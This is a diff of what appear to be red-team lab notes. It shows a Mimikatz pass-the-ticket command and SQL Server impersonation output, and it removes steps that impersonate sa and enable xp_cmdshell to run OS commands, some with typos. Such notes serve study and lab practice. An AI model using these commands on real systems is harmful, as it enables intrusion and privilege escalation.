@@ -268,16 +268,6 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@us.marvel.local@US.MA
 
 ```
 ### SQL Server Escalation
-Enumerate permissions:
-```
-PS C:\> Get-SQLQuery -Instance $instance -Verbose -Query "select * FROM fn_my_permissions(NULL,'SERVER')"
-VERBOSE: MVU-SQL.us.marvel.local : Connection Success.
-
-entity_name subentity_name permission_name
------------ -------------- ---------------
-server                     CONNECT SQL
-server                     VIEW ANY DATABASE
-```
 Check impersonation possibilities
 
 ```
@@ -298,16 +288,6 @@ VERBOSE: UFC-SQLDev.us.funcorp.local : CONNECTION SUCCESS.
 VERBOSE: UFC-SQLDev.us.funcorp.local : - Logins can be impersonated.
 VERBOSE: UFC-SQLDev.us.funcorp.local : - dbuser can impersonate the sa sysadmin login.
 VERBOSE: UFC-SQLDev.us.funcorp.local : - EXPLOITING: Starting exploit process...
-```
-Manualy:
-```
-EXECUTE AS LOGNIN ='sa'
-EXEC sp_configure 'show advanced options', 1
-RECONFIGURE
-exec sp_configure 'xp_cmdshell',1
-RECONFIGURE
-EXEC master..xp_cmdshell 'whoami'''
-
 ```
 
 ## Presistance
